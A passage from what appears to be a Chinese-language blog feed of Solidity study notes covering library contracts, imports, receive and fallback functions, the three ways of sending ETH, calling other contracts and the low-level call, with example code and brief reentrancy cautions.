// catch失败的 revert() 和 require()<br>        emit CatchEvent(reason);<br>    &#125; catch (bytes memory reason) &#123;<br>        // catch失败的 assert()<br>        emit CatchByte(reason);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当运行<code>executeNew(0)</code>时，因为<code>0</code>不满足<code>require(a != 0, &quot;invalid number&quot;);</code>，会失败并释放<code>CatchEvent</code>事件。</p><p><img src="/img/web3/solidity30-3.png" alt="30-1"></p><p>当运行<code>executeNew(1)</code>时，因为<code>1</code>不满足<code>assert(a != 1);</code>，会失败并释放<code>CatchByte</code>事件。</p><p><img src="/img/web3/solidity30-4.png" alt="30-1"></p><p>当运行<code>executeNew(2)</code>时，因为<code>2</code>满足<code>require(a != 0, &quot;invalid number&quot;);</code>和<code>assert(a != 1);</code>，会成功并释放<code>SuccessEvent</code>事件。</p><p><img src="/img/web3/solidity30-5.png" alt="30-1"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>08-3Solidity笔记之三库合约receiveCall</title>
    <link href="/2025/05/05/08-3Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%89/"/>
    <url>/2025/05/05/08-3Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h1 id="17-库合约-站在巨人的肩膀上"><a href="#17-库合约-站在巨人的肩膀上" class="headerlink" title="17. 库合约 站在巨人的肩膀上"></a>17. 库合约 站在巨人的肩膀上</h1><p>库合约是一种特殊的合约，为了提升<code>Solidity</code>代码的复用性和减少<code>gas</code>而存在。库合约是一系列的函数合集，由大神或者项目方创作，咱们站在巨人的肩膀上，会用就行了。</p><blockquote><p>就是py的第三方库</p></blockquote><p>他和普通合约主要有以下几点不同：</p><ol><li><strong>不能存在状态变量</strong></li><li><strong>不能够继承或被继承</strong></li><li><strong>不能接收以太币</strong></li><li><strong>不可以被销毁</strong></li></ol><p><strong>注意</strong>：库合约中的函数可见性如果被设置为<code>public</code>或者<code>external</code>，则在调用函数时会触发一次<code>delegatecall</code>。而如果被设置为<code>internal</code>，则不会引起。对于设置为<code>private</code>可见性的函数来说，其仅能在库合约中可见，在其他合约中不可用。</p><h2 id="Strings库合约【示例】"><a href="#Strings库合约【示例】" class="headerlink" title="Strings库合约【示例】"></a>Strings库合约【示例】</h2><p><code>Strings库合约</code>是将<code>uint256</code>类型转换为相应的<code>string</code>类型的代码库，样例代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs solidity">library Strings &#123;<br>    bytes16 private constant _HEX_SYMBOLS = &quot;0123456789abcdef&quot;;<br><br>    /**<br>     * @dev Converts a `uint256` to its ASCII `string` decimal representation.<br>     */<br>    function toString(uint256 value) public pure returns (string memory) &#123;<br>        // Inspired by OraclizeAPI&#x27;s implementation - MIT licence<br>        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol<br><br>        if (value == 0) &#123;<br>            return &quot;0&quot;;<br>        &#125;<br>        uint256 temp = value;<br>        uint256 digits;<br>        while (temp != 0) &#123;<br>            digits++;<br>            temp /= 10;<br>        &#125;<br>        bytes memory buffer = new bytes(digits);<br>        while (value != 0) &#123;<br>            digits -= 1;<br>            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));<br>            value /= 10;<br>        &#125;<br>        return string(buffer);<br>    &#125;<br><br>    /**<br>     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.<br>     */<br>    function toHexString(uint256 value) public pure returns (string memory) &#123;<br>        if (value == 0) &#123;<br>            return &quot;0x00&quot;;<br>        &#125;<br>        uint256 temp = value;<br>        uint256 length = 0;<br>        while (temp != 0) &#123;<br>            length++;<br>            temp &gt;&gt;= 8;<br>        &#125;<br>        return toHexString(value, length);<br>    &#125;<br><br>    /**<br>     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.<br>     */<br>    function toHexString(uint256 value, uint256 length) public pure returns (string memory) &#123;<br>        bytes memory buffer = new bytes(2 * length + 2);<br>        buffer[0] = &quot;0&quot;;<br>        buffer[1] = &quot;x&quot;;<br>        for (uint256 i = 2 * length + 1; i &gt; 1; --i) &#123;<br>            buffer[i] = _HEX_SYMBOLS[value &amp; 0xf];<br>            value &gt;&gt;= 4;<br>        &#125;<br>        require(value == 0, &quot;Strings: hex length insufficient&quot;);<br>        return string(buffer);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>它主要包含两个函数，<code>toString()</code>将<code>uint256</code>转换为10进制的<code>string</code>，<code>toHexString()</code>将<code>uint256</code>转换为16进制的<code>string</code>。</p><h3 id="如何使用库合约"><a href="#如何使用库合约" class="headerlink" title="如何使用库合约"></a>如何使用库合约</h3><p>我们用<code>Strings</code>库合约的<code>toHexString()</code>来演示两种使用库合约中函数的办法。</p><ol><li><p>利用using for指令</p><p>指令<code>using A for B;</code>可用于附加库合约（从库 A）到任何类型（B）。添加完指令后，库<code>A</code>中的函数会自动添加为<code>B</code>类型变量的成员，可以直接调用。注意：在调用的时候，这个变量会被当作第一个参数传递给函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 利用using for指令<br>using Strings for uint256;<br>function getString1(uint256 _number) public pure returns(string memory)&#123;<br>    // 库合约中的函数会自动添加为uint256型变量的成员<br>    return _number.toHexString();<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>通过库合约名称调用函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 直接通过库合约名调用<br>function getString2(uint256 _number) public pure returns(string memory)&#123;<br>    return Strings.toHexString(_number);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>我们部署合约并输入<code>170</code>测试一下，两种方法均能返回正确的<code>16进制string</code> “0xaa”。证明我们调用库合约成功！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一讲，我们用<code>ERC721</code>的引用的库合约<code>Strings</code>为例介绍<code>Solidity</code>中的库合约（<code>Library</code>）。99%的开发者都不需要自己去写库合约，会用大神写的就可以了。我们只需要知道什么情况该用什么库合约。常用的有：</p><ol><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Strings.sol">Strings</a>：将<code>uint256</code>转换为<code>String</code></li><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Address.sol">Address</a>：判断某个地址是否为合约地址</li><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Create2.sol">Create2</a>：更安全的使用<code>Create2 EVM opcode</code></li><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Arrays.sol">Arrays</a>：跟数组相关的库合约</li></ol><h1 id="18-Import"><a href="#18-Import" class="headerlink" title="18. Import"></a>18. Import</h1><blockquote><p>导包</p></blockquote><h2 id="import用法"><a href="#import用法" class="headerlink" title="import用法"></a><code>import</code>用法</h2><ul><li><p>通过源文件相对位置导入，例子：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">文件结构<br>├── Import.sol<br>└── Yeye.sol<br><br>// 通过文件相对位置import<br>import &#x27;./Yeye.sol&#x27;;<br></code></pre></td></tr></table></figure></li><li><p>通过源文件网址导入网上的合约的全局符号，例子：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">// 通过网址引用<br>import &#x27;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol&#x27;;<br></code></pre></td></tr></table></figure></li><li><p>通过<code>npm</code>的目录导入，例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">import &#x27;@openzeppelin/contracts/access/Ownable.sol&#x27;;<br></code></pre></td></tr></table></figure></li><li><p>通过指定<code>全局符号</code>导入合约特定的全局符号，例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">import &#123;Yeye&#125; from &#x27;./Yeye.sol&#x27;;<br></code></pre></td></tr></table></figure></li><li><p>引用(<code>import</code>)在代码中的位置为：在声明版本号之后，在其余代码之前。</p></li></ul><h2 id="测试导入结果"><a href="#测试导入结果" class="headerlink" title="测试导入结果"></a>测试导入结果</h2><p>我们可以用下面这段代码测试是否成功导入了外部源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>// 通过文件相对位置import<br>import &#x27;./Yeye.sol&#x27;;<br>// 通过`全局符号`导入特定的合约<br>import &#123;Yeye&#125; from &#x27;./Yeye.sol&#x27;;<br>// 通过网址引用<br>import &#x27;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol&#x27;;<br>// 引用OpenZeppelin合约<br>import &#x27;@openzeppelin/contracts/access/Ownable.sol&#x27;;<br><br>contract Import &#123;<br>    // 成功导入Address库<br>    using Address for address;<br>    // 声明yeye变量<br>    Yeye yeye = new Yeye();<br><br>    // 测试是否能调用yeye的函数<br>    function test() external&#123;<br>        yeye.hip();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="19-接收ETH-receive和fallback"><a href="#19-接收ETH-receive和fallback" class="headerlink" title="19. 接收ETH receive和fallback"></a>19. 接收ETH receive和fallback</h1><p><code>Solidity</code>支持两种特殊的回调函数，<code>receive()</code>和<code>fallback()</code>，他们主要在两种情况下被使用：</p><ol><li>接收ETH</li><li>处理合约中不存在的函数调用（代理合约proxy contract）</li></ol><p>注意⚠️：在Solidity 0.6.x版本之前，语法上只有 <code>fallback()</code> 函数，用来接收用户发送的ETH时调用以及在被调用函数签名没有匹配到时，来调用。 0.6版本之后，Solidity才将 <code>fallback()</code> 函数拆分成 <code>receive()</code> 和 <code>fallback()</code> 两个函数。</p><p>我们这一讲主要讲接收ETH的情况。</p><h2 id="接收ETH函数-receive"><a href="#接收ETH函数-receive" class="headerlink" title="接收ETH函数 receive"></a>接收ETH函数 receive</h2><ul><li><strong><code>receive</code> 函数</strong>：专门用来接收 <strong>纯粹的以太币转账</strong>（即没有调用任何函数的数据）。</li><li><strong><code>fallback</code> 函数</strong>：当调用的函数不存在，或者调用时带有数据但没有匹配的函数时执行；也可以用来接收以太币（如果没有 <code>receive</code> 函数）。</li></ul><h3 id="receive-接收函数"><a href="#receive-接收函数" class="headerlink" title="receive() 接收函数"></a><code>receive()</code> 接收函数</h3><ul><li>只在合约接收到没有任何数据的以太币转账时执行，例如使用 <code>address.send()</code>、<code>address.transfer()</code> 或者空数据的 <code>call</code>。</li><li>一个合约只能有一个 <code>receive</code> 函数。</li><li>如果没有定义 <code>receive</code> 函数，且有 <code>payable fallback</code> 函数，纯以太币转账会调用 <code>fallback</code> 函数。</li><li>如果两者都没有，合约会拒绝接收纯以太币转账，交易回滚。</li><li>receive最好不要有复杂的逻辑：因为如果别人用<code>send</code>和<code>transfer</code>方法发送<code>ETH</code>的话，<code>gas</code>会限制在<code>2300</code>，<code>receive()</code>太复杂可能会触发<code>Out of Gas</code>报错；如果用<code>call</code>就可以自定义<code>gas</code>执行更复杂的逻辑</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 定义事件<br>event Received(address Sender, uint Value);<br>// 接收ETH时释放Received事件<br>receive() external payable &#123;<br>    emit Received(msg.sender, msg.value);<br>&#125;<br></code></pre></td></tr></table></figure><p>有些恶意合约，会在<code>receive()</code> 函数（老版本的话，就是 <code>fallback()</code> 函数）嵌入恶意消耗<code>gas</code>的内容或者使得执行故意失败的代码，导致一些包含退款和转账逻辑的合约不能正常工作，因此写包含退款等逻辑的合约时候，一定要注意这种情况。</p><h3 id="fallback-函数"><a href="#fallback-函数" class="headerlink" title="fallback() 函数"></a><code>fallback()</code> 函数</h3><ul><li>当调用的函数不存在时执行。</li><li>也会在调用带数据但无匹配函数时执行。</li><li>必须由<code>external</code>修饰，一般也会用<code>payable</code>修饰，用于接收ETH:<code>fallback() external payable &#123; ... &#125;</code>。</li><li>适合做代理合约、日志记录、或者处理未知函数调用。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">event fallbackCalled(address Sender, uint Value, bytes Data);<br><br>// fallback<br>fallback() external payable&#123;<br>    emit fallbackCalled(msg.sender, msg.value, msg.data);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="receive和fallback的区别"><a href="#receive和fallback的区别" class="headerlink" title="receive和fallback的区别"></a>receive和fallback的区别</h2><p><code>receive</code>和<code>fallback</code>都能够用于接收<code>ETH</code>，他们触发的规则如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">触发fallback() 还是 receive()?<br>           接收ETH<br>              |<br>         msg.data是空？<br>            /  \<br>          是    否<br>          /      \<br>receive()存在?   fallback()<br>        / \<br>       是  否<br>      /     \<br>receive()   fallback()<br></code></pre></td></tr></table></figure><p>简单来说，合约接收<code>ETH</code>时，<code>msg.data</code>为空且存在<code>receive()</code>时，会触发<code>receive()</code>；<code>msg.data</code>不为空或不存在<code>receive()</code>时，会触发<code>fallback()</code>，此时<code>fallback()</code>必须为<code>payable</code>。</p><p><code>receive()</code>和<code>payable fallback()</code>均不存在的时候，向合约<strong>直接</strong>发送<code>ETH</code>将会报错（你仍可以通过带有<code>payable</code>的函数向合约发s送<code>ETH</code>）。</p><p><img src="/img/web3/solidity19-1.png" alt="s"></p><p><img src="/img/web3/solidity19-2.jpg" alt="s"></p><h1 id="20-发送ETH"><a href="#20-发送ETH" class="headerlink" title="20. 发送ETH"></a>20. 发送ETH</h1><p><code>Solidity</code>有三种方法向其他合约发送<code>ETH</code>，他们是：<code>transfer()</code>，<code>send()</code>和<code>call()</code>，其中<code>call()</code>是被鼓励的用法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract ReceiveETH &#123;<br>    // 收到eth事件，记录amount和gas<br>    event Log(uint amount, uint gas);<br>    <br>    // receive方法，接收eth时被触发<br>    receive() external payable&#123;<br>        emit Log(msg.value, gasleft());<br>    &#125;<br>    <br>    // 返回合约ETH余额<br>    function getBalance() view public returns(uint) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>部署合约后调用getBalance 方法查询合约当前余额显示当前余额是0</p><h2 id="发送ETH合约-三种方法"><a href="#发送ETH合约-三种方法" class="headerlink" title="发送ETH合约 三种方法"></a>发送ETH合约 三种方法</h2><p>在发送之前，现在发送ETH合约，先在发送ETH合约<code>SendETH</code>中实现<code>payable</code>的<code>构造函数</code>和<code>receive()</code>，让我们能够在部署时和部署后向合约转账。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract SendETH &#123;<br>    // 构造函数，payable使得部署的时候可以转eth进去<br>    constructor() payable&#123;&#125;<br>    // receive方法，接收eth时被触发<br>    receive() external payable&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1、transfer"><a href="#1、transfer" class="headerlink" title="1、transfer"></a>1、transfer</h3><ul><li>用法是<code>接收方地址.transfer(发送ETH数额)</code>。</li><li><code>transfer()</code>的<code>gas</code>限制是<code>2300</code>，足够用于转账，但对方合约的<code>fallback()</code>或<code>receive()</code>函数不能实现太复杂的逻辑。</li><li><code>transfer()</code>如果转账失败，会自动<code>revert</code>（回滚交易）。</li></ul><p>代码样例，注意里面的<code>_to</code>填<code>ReceiveETH</code>合约的地址，<code>amount</code>是<code>ETH</code>转账金额：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 用transfer()发送ETH<br>function transferETH(address payable _to, uint256 amount) external payable&#123;<br>    _to.transfer(amount);<br>&#125;<br></code></pre></td></tr></table></figure><p>部署<code>SendETH</code>合约后，对<code>ReceiveETH</code>合约发送ETH，此时<code>amount</code>为10，<code>value</code>为0，<code>amount</code>&gt;<code>value</code>，转账失败，发生<code>revert</code>。</p><p><img src="/img/web3/solidity20-1.jpg" alt="s"></p><p>此时<code>amount</code>为10，<code>value</code>为10，<code>amount</code>&lt;&#x3D;<code>value</code>，转账成功。</p><p><img src="/img/web3/solidity20-2.jpg" alt="s"></p><p>在<code>ReceiveETH</code>合约中，运行<code>getBalance()</code>函数，可以看到当前合约的<code>ETH</code>余额为<code>10</code></p><p><img src="/img/web3/solidity20-3.jpg" alt="s"></p><h3 id="send"><a href="#send" class="headerlink" title="send"></a>send</h3><ul><li>用法是<code>接收方地址.send(发送ETH数额)</code>。</li><li><code>send()</code>的<code>gas</code>限制是<code>2300</code>，足够用于转账，但对方合约的<code>fallback()</code>或<code>receive()</code>函数不能实现太复杂的逻辑。</li><li><code>send()</code>如果转账失败，不会<code>revert</code>。</li><li><code>send()</code>的返回值是<code>bool</code>，代表着转账成功或失败，需要额外代码处理一下。</li></ul><p>代码样例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">error SendFailed(); // 用send发送ETH失败error<br><br>// send()发送ETH<br>function sendETH(address payable _to, uint256 amount) external payable&#123;<br>    // 处理下send的返回值，如果失败，revert交易并发送error<br>    bool success = _to.send(amount);<br>    if(!success)&#123;<br>        revert SendFailed();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行结果与上面的transfer 一致。。。。</p><h3 id="call"><a href="#call" class="headerlink" title="call"></a>call</h3><ul><li>用法是<code>接收方地址.call&#123;value: 发送ETH数额&#125;(&quot;&quot;)</code>。</li><li><code>call()</code>没有<code>gas</code>限制，可以支持对方合约<code>fallback()</code>或<code>receive()</code>函数实现复杂逻辑。</li><li><code>call()</code>如果转账失败，不会<code>revert</code>。</li><li><code>call()</code>的返回值是<code>(bool, bytes)</code>，其中<code>bool</code>代表着转账成功或失败，需要额外代码处理一下。</li></ul><p>执行结果与上面的transfer一致</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>这一讲，我们介绍<code>Solidity</code>三种发送<code>ETH</code>的方法：<code>transfer</code>，<code>send</code>和<code>call</code>。</p><ul><li><code>call</code>没有<code>gas</code>限制，最为灵活，是最提倡的方法；</li><li><code>transfer</code>有<code>2300 gas</code>限制，但是发送失败会自动<code>revert</code>交易，是次优选择；</li><li><code>send</code>有<code>2300 gas</code>限制，而且发送失败不会自动<code>revert</code>交易，几乎没有人用它。</li></ul><table><thead><tr><th>方法</th><th>自动回滚失败</th><th>返回值</th><th>Gas 限制</th><th>灵活性</th><th>安全性</th></tr></thead><tbody><tr><td><code>transfer</code></td><td>是</td><td>无</td><td>2300</td><td>低</td><td>安全，但可能失败</td></tr><tr><td><code>send</code></td><td>否</td><td>有</td><td>2300</td><td>低</td><td>需要手动处理失败</td></tr><tr><td><code>call</code></td><td>否</td><td>有</td><td>无限制</td><td>高</td><td>灵活但需防范重入攻击风险</td></tr></tbody></table><h2 id="重要提示"><a href="#重要提示" class="headerlink" title="重要提示"></a>重要提示</h2><ul><li><strong>重入攻击风险</strong>：使用 <code>call</code> 发送 ETH 时，接收合约可能执行恶意代码，导致重入攻击。建议使用“检查-效果-交互”模式，或者引入重入锁（<code>ReentrancyGuard</code>）保护。</li><li><strong>推荐用法</strong>：现代 Solidity 合约推荐使用 <code>call</code>，因为它灵活且兼容更多情况，但要注意安全。</li></ul><h1 id="21-调用其他合约"><a href="#21-调用其他合约" class="headerlink" title="21. 调用其他合约"></a>21. 调用其他合约</h1><p>在<code>Solidity</code>中，一个合约可以调用另一个合约的函数，这在构建复杂的DApps时非常有用。</p><h2 id="目标合约"><a href="#目标合约" class="headerlink" title="目标合约"></a>目标合约</h2><p>我们先写一个简单的合约<code>OtherContract</code>，用于被其他合约调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract OtherContract &#123;<br>    uint256 private _x = 0; // 状态变量_x<br>    // 收到eth的事件，记录amount和gas<br>    event Log(uint amount, uint gas);<br>    <br>    // 返回合约ETH余额<br>    function getBalance() view public returns(uint) &#123;<br>        return address(this).balance;<br>    &#125;<br><br>    // 可以调整状态变量_x的函数，并且可以往合约转ETH (payable)<br>    function setX(uint256 x) external payable&#123;<br>        _x = x;<br>        // 如果转入ETH，则释放Log事件<br>        if(msg.value &gt; 0)&#123;<br>            emit Log(msg.value, gasleft());<br>        &#125;<br>    &#125;<br><br>    // 读取_x<br>    function getX() external view returns(uint x)&#123;<br>        x = _x;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个合约包含一个状态变量<code>_x</code>，一个事件<code>Log</code>在收到<code>ETH</code>时触发，三个函数：</p><ul><li><code>getBalance()</code>: 返回合约<code>ETH</code>余额。</li><li><code>setX()</code>: <code>external payable</code>函数，可以设置<code>_x</code>的值，并向合约发送<code>ETH</code>。</li><li><code>getX()</code>: 读取<code>_x</code>的值。</li></ul><h2 id="调用OtherContract合约"><a href="#调用OtherContract合约" class="headerlink" title="调用OtherContract合约"></a>调用<code>OtherContract</code>合约</h2><p>我们可以利用合约的地址和合约代码（或接口）来创建合约的引用：</p><ul><li><code>_Name(_Address)</code>，其中<code>_Name</code>是合约名，应与合约代码（或接口）中标注的合约名保持一致，</li><li><code>_Address</code>是合约地址。</li><li>然后用合约的引用来调用它的函数：<code>_Name(_Address).f()</code>，其中<code>f()</code>是要调用的函数</li></ul><p>4个示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">&#125;<br>contract CallContract &#123;<br>    // 示例一：<br>    // callSetX 要传对应的合约地址和x变量值，<br>    // 调用callSetX方法后，再次查询OtherContract的x的值，发现发生了改变<br>    function callSetX(address _Address,uint256 x)external  &#123;<br>        // 合约名称(合约地址).方法名称(方法参数) <br>        OtherContract(_Address).setX(x);// 调用OtherContract的<br>    &#125;<br>    // 示例二： 在入参中类型直接写要调用的合约名称，值写地址，传参的时候就传对方合约<br>    function callGetX(OtherContract _Address)external view returns (uint x) &#123;<br>        x = _Address.getX();<br>    &#125;<br>    // 示例三：可以创建合约变量，然后通过它来调用目标函数。<br>    function callGetX2(address _Address)external view returns (uint x) &#123;<br>        OtherContract oc = OtherContract(_Address);//变量oc存储了OtherContract合约的引用<br>        x = oc.getX();<br>    &#125;<br>    // 示例四：调用合约并发送ETH，调用目标合约的拥有payable的函数来给目标合约转账eth<br>    function setTransferETH(address otherContract,uint256 x)payable external  &#123;<br>        // 如果目标合约的函数是payable的，则可以通过调用这个函数来给合约转账<br>        OtherContract(otherContract).setX&#123;value:msg.value&#125;(x);<br>        // 调用setTransferETH 的时候注意，传入合约地址，传入x变量，然后value给10ETH<br>        // 此时发现，目标合约的x变量被改变了，且目标合约收到了10ETH的转账<br>        // 所以设计的意义就是可以通过一次调用，实现“状态修改 + 资金转账”的两个动作<br>        // 二是方便合约之间交互，尤其是需要用ETH作为调用条件或者支付费用时<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="22-Call"><a href="#22-Call" class="headerlink" title="22. Call"></a>22. Call</h1><p>call 是底层函数，是地址类型数据自带的底层函数（方法），用来与其他合约交互</p><p>它的返回值为<code>(bool, bytes memory)</code>对应是否成功和目标函数的返回值</p><ul><li><code>call</code>是<code>Solidity</code>官方推荐的通过触发<code>fallback</code>或<code>receive</code>函数发送<code>ETH</code>的方法。</li><li>不推荐用<code>call</code>来调用另一个合约，因为当你调用不安全合约的函数时，你就把主动权交给了它。推荐的方法仍是声明合约变量后调用函数，如：<code>OtherContract(_Address).func(args)</code>见<a href="https://github.com/AmazingAng/WTF-Solidity/tree/main/21_CallContract">第21讲：调用其他合约</a></li><li>当我们不知道对方合约的源代码或<code>ABI</code>，就没法生成合约变量；这时，我们仍可以通过<code>call</code>调用对方合约的函数。</li></ul><h2 id="call-使用规则"><a href="#call-使用规则" class="headerlink" title="call 使用规则"></a>call 使用规则</h2><p><code>call</code>的使用规则如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">目标合约地址.call(字节码);<br></code></pre></td></tr></table></figure><p>其中<code>字节码</code>利用结构化编码函数<code>abi.encodeWithSignature</code>获得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">abi.encodeWithSignature(&quot;函数签名&quot;, 